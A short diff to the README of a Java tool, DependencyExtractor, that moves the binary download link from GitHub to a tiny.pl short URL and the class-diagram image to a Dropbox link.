@@ -3,7 +3,7 @@
 **Author:** Krzysztof Wieconkowski  
 **Program Name:** DependencyExtractor  
 **Source Code Link (Java):** [https://github.com/conek/DependencyExtractor](https://github.com/conek/DependencyExtractor)  
-**Compressed Binary Application Link (Java):** [https://github.com/conek/DependencyExtractor/blob/main/dist/dependencyExtractor_binary.zip](https://github.com/conek/DependencyExtractor/blob/main/dist/dependencyExtractor_binary.zip)  
+**Compressed Binary Application Link (zip):** [https://tiny.pl/dphsx](https://tiny.pl/dphsx)  
 
 ## Project Objective
 
@@ -51,7 +51,7 @@ The application is launched from the command line, featuring a help section that
 
 ## Diagram
 
-![Screenshot of a class diagram](https://github.com/conek/DependencyExtractor/blob/main/diagrams/classDiagram.png)
+![Screenshot of a class diagram](https://www.dropbox.com/scl/fi/55rletfruuidso6u2c2mo/classDiagram.png?rlkey=0nrk1ldohugn2jmmt9ywm54oe&st=vij9zet3&dl=1)
 
 ## Available Options in the Program
 
